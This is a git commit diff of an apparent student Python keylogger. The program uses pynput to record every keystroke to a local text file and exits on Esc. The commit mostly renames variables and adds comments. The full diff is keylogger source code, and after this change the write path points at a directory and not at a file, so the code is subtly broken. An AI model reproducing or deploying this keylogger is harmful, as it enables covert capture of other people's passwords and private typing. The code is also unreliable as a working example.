42ce242b385309493ccced859f990f82a8806e04
Muhammed Shahad <83578203+shahadcho@users.noreply.github.com>
2022-06-12 13:43:48 +0530

    Update keylogger s6 python.py

--- keylogger s6 python.py
+++ keylogger s6 python.py
@@ -4,10 +4,10 @@
 from pynput.keyboard import Key, Listener
 
 
-keys_information = "key_log.txt"
-file_path = "C:\\Users\\shaha\\PycharmProjects\\S6keylogger"
+key_strokes = "key_log.txt"
+key_path = "C:\\Users\\shaha\\PycharmProjects\\S6keylogger"
 extend = "\\"
-file_merge = file_path + extend
+file_merge = key_path + extend
 
 
 #keystroke gathering!!!!
@@ -15,6 +15,8 @@ file_merge = file_path + extend
 count = 0
 keys =[]
 
+
+#Logging the Keystrokes into the list Keys[]
 def on_press(key):
     global keys, count
 
@@ -22,15 +24,16 @@ def on_press(key):
     keys.append(key)
     count += 1
 
-    if count >= 1:
+    if count >= 1:       #checking if any key is pressed
         count = 0
-        write_file(keys)
-        keys = []
+        write_file(keys)  #calling the function write file to log the (key) into text file key_strokes.txt
+        keys = []         #emptying the list 
 
 
+#sorting the keystrokes
 
 def write_file(keys):
-    with open(file_path + extend + keys_information, "a") as f:
+    with open(file_merge, "a") as f:
         for key in keys:
             k = str(key).replace("'", "")
             if k.find("space") > 0:
@@ -40,11 +43,14 @@ def write_file(keys):
                 f.write(k)
                 f.close()
 
+      
+    
+# definging the function to exit from keylogger program(key= esc)
 def on_release(key):
     if key == Key.esc:
         return False
 
-
+#calling the funtions (on_press,on_release)
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
 
